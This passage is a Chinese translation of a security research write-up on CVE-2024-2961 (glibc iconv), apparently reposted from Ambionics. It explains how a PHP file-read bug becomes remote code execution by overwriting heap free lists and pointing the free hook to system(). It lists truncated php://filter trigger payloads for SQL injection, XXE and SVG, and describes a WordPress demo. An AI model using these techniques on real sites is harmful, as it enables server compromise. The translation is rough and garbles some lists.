的堆来完全忽略这个问题。由于它的对齐方式（~0x1fffff  
）和大小（2MB  
），它很容易识别。它的顶部有一个  
zend_mm_heap  
结构，其中包含非常有用的字段：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">struct</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">_zend_mm_heap</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> {    ...    int                use_custom_heap;    ...    zend_mm_free_slot *free_slot[ZEND_MM_BINS]; </span><em><span style="font-family:Consolas;line-height:120%;mso-ansi-font-style:italic;font-size:11.0000pt;">/* free lists for small sizes */</span></em><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">    ...    </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">union</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> {        </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">struct</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> {            void      *(*_malloc)(size_t);            void       (*_free)(void*);            void      *(*_realloc)(void*, size_t);        } std;    } custom_heap;};</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
首先，它包含每个空闲列表。通过覆盖空闲列表，我们可以获得任意数量、任意大小的write-what-where  
。我们可以使用这些来覆盖最后一个字段，  
custom_heap  
其中包含  
emalloc()  
、  
efree()  
和的替代函数  
erealloc()  
（类似于  
__malloc_hook  
glibc   
中的 和 兄弟）。然后，我们将 设置  
use_custom_heap  
为  
1  
，并调用  
free()  
bucket  
，从而获得具有受控参数的任意函数调用。由于我们可以使用文件读取访问二进制文件，因此我们可以构建精美的   
ROP   
链，但我们希望尽可能通用；因此，我将 设置  
custom_heap._free  
为  
system  
，从而允许我们以 CTF   
方式运行任意   
bash   
命令。  
  
注意：我遗漏了关于该漏洞利用的一些（很多）细节，但该漏洞利用已得到大量评论。  
  
**利用性能**  
  
我们的漏洞利用程序运行 3   
个请求：下载  
/proc/self/maps  
，并提取 PHP   
堆的地址和   
libc   
的文件名。然后下载   
libc   
二进制文件以提取的地址  
system()  
。最后，它执行最后一个请求以执行溢出并执行我们的任意命令。  
  
它的表现非常好：  
  
•   
针对**任何目标**  
  
￮   
从 PHP 7.0.0 (2015)   
到   
8.3.7 (2024)  
  
￮   
任何 PHP   
应用程序：  
Wordpress  
、  
Laravel   
等。  
  
• **100%**  
可靠  
  
￮   
由于它的实现，它永远不会（？）产生崩溃  
  
￮   
感觉像网络漏洞的二进制漏洞！  
  
•   
有效负载**小于**  
1000**字节**  
  
￮   
通过使用  
zlib.inflate  
12   
个滤波器，有效载荷非常小  
  
￮   
它适合 GET   
请求  
  
•   
独立利用  
  
￮   
无需以 GET   
或   
POST   
形式发送其他参数：漏洞利用会自行完成所有操作，从填充堆到设置空闲列表，最后实现代码执行  
  
它是一个小于 1000   
字节的单一有效负载，可导致  
10   
年   
PHP   
版本的**远程代码执行。**  
  
**演示**  
  
为了说明这一点，我将以运行在**PHP 8.3.x上的Wordpress**  
实例为目标。为了引入文件读取漏洞，我添加了**BuddyForms 插件 (v2.7.7)**  
，该插件存在  
CVE-2023-26326  
漏洞。该漏洞最初被报告为 PHAR   
反序列化漏洞，但   
Wordpress   
没有任何反序列化小工具链。无论如何，目标运行在   
PHP 8+   
上，因此不易受到   
PHAR   
攻击。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SR3ffuNt8MGEDibupmVGC969y3gAJ0oFpjarxNuU84K1hrRYHicYWrUTYvZhYzqPU3f8O6OI0YvxqMw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SR3ffuNt8MGEDibupmVGC969bAIcgUX7iakyLgvPcjTq90hPUqPb8lTtdztas0xxPQibXoAK7uPjo2zw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SR3ffuNt8MGEDibupmVGC969HCHZt51AocBkuVZ6piaSpnlVaHBm203WhqvK3tJ2lhhxtkkW08tzfSQ/640?wx_fmt=png&from=appmsg "")  
  
注意：如果您阅读原始 finder 的建议，您可能会看到在文件读取原语之前，getimagesize()会执行一个调用来检查文件是否为图像。因此，为了让漏洞能够读取/proc/self/mapslibc，我使用了wrapwrap使它们看起来像 GIF 图像。  
  
**影响**  
  
这对 PHP   
生态系统有何影响？这不是一个新的漏洞，而是一种新的漏洞利用媒介。然而，有很多方法可以让   
PHP   
读取文件；文件读取原语在   
Web   
应用程序中非常常见。  
  
**标准水槽**  
  
显然， PHP   
的每个标准文件读取  
接收器都会受到影响：  
file_get_contents()  
，，，，，，，等等。**文件写入**  
也会受到影响（及其兄弟）。  
file()readfile()fgets()getimagesize()SplFileObject->read()  
   
file_put_contents()  
  
**利用漏洞**  
  
**SQL注入RCE**  
  
如果你在 PDO/MySQL   
上遇到 SQL   
注入，你可能能够使用  
LOAD DATA LOCAL INFILE  
：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">LOAD</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">DATA</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">LOCAL</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> INFILE &#39;php://filter/cnext...&#39;;</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
**XXE**  
  
XXE   
现在是   
RCE  
。  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">&lt;?xml version=&#34;1.0&#34; ?&gt;&lt;!DOCTYPE root [    &lt;!ENTITY exploit SYSTEM &#34;php://filter/cnext...&#34;&gt;</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">]&gt;</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">&lt;root&gt;&amp;exploit;&lt;/root&gt;</span></strong><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
**作为 PHAR 的替代品**  
  
与 PHAR   
攻击相反，仅对文件执行检查的函数（例如  
file_exists()  
、   
或  
is_file()  
）**不受影响**  
。但是，在其他情况下，该漏洞可用作 PHAR   
攻击的替代品，如演示中所示。禁用  
phar://  
或更新到 PHP 8   
不会拯救你。  
  
**解析库**  
  
任何以某种方式操纵 URL   
的库都可能存在漏洞。以下是我在研究漏洞时发现的一些新目标：  
  
•   
meyfa/php-svg  
：最流行的 SVG   
操作库  
  
•   
symfony/translation  
：XLIFF   
解析器存在漏洞  
  
例如，  
PHP-SVG  
库可能会受到这样的有效载荷的攻击：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">&lt;svg</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> width=&#34;100&#34; height=&#34;100&#34;    </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">&lt;image</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> href=&#34;php://filter/cnext/...&#34; width=&#34;1&#34; height=&#34;1&#34; </span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
HTML   
到   
PDF   
解析器（例如   
dompdf  
、  
tcpdf   
和其他解析器）也可能是目标。  
  
**类实例**  
  
有时，在攻击 PHP   
时，您会遇到以下原语：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">new</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> $_GET[&#39;cls&#39;]($_GET[&#39;argument&#39;]);</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
PTswarm   
的这篇优秀博文  
介绍了从此原语读取文件的多种方法，这些方法都可用于触发漏洞。示例包括  
SoapClient  
、、或。  
ImagicktidySimpleXMLElement  
  
**作为对小工具链的改进**  
  
如果您找到文件读取  
unserialize()  
小工具链，则可以利用该漏洞将其升级为 RCE  
。随着最近的应用程序和   
PHP   
库越来越多地使用类型的事实，它可能会派上用场。  
  
**其他人可能**  
  
只要你控制文件读取或文件写入接收器的前缀，你就拥有了 RCE  
！  
  
**时间线**  
  
• **去年**  
Crash   
发现  
  
• **二月**  
开始修复 bug  
  
• **3 月 26 日**  
向 glibc   
安全团队报告   
Bug  
  
￮   
他们做得太棒了！  
  
• **4 月 4 日**  
向 Linux   
发行版报告错误  
  
• **4 月 17 日**  
漏洞发布为 CVE-2024-2961  
  
注意：glibc 安全团队速度快、态度好、技术好。他们在一周内就发布了补丁（以及所有随附的补丁）。非常感谢！  
  
**结论**  
  
**以上就是关于CNEXT**  
 (CVE-2024-2961)  
系列的第一部分。漏洞利用现已在  
我们的 GitHub  
上发布。还有更多内容需要探索：直接调用  
会怎样  
iconv()  
？如果文件读取是盲的  
会发生什么？  
  
在第 2   
部分中，我们将深入研究   
PHP   
引擎，以定位  
iconv()  
非常流行的**PHP Webmail**  
中发现的调用。我将描述此类直接调用对 PHP   
生态系统的影响，并向您展示一些意想不到的  
陷阱。最后，在第 3   
部分中，我们将介绍盲文件读取利用。  
  
**原文：******  
  
https://www.ambionics.io/blog/iconv-cve-2024-2961-p1  
  
**交流群**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/sMuor7fV7STpdpZNticP4ab9mEFy8ibsibH3KN8kviahIbNybv5QUyQVMRXQnJa2fFIqJibTwjodvYFrAD3iaS3epgZQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
### 广告  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRL76Z9A9JkHxXhbYz7SEvGZCVuazTichcM4GOmBA2SKPqBtgwTMjUjOwplgx5SeW2eGcgAr3Oh9SA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
  
  
  
  
  
  
  
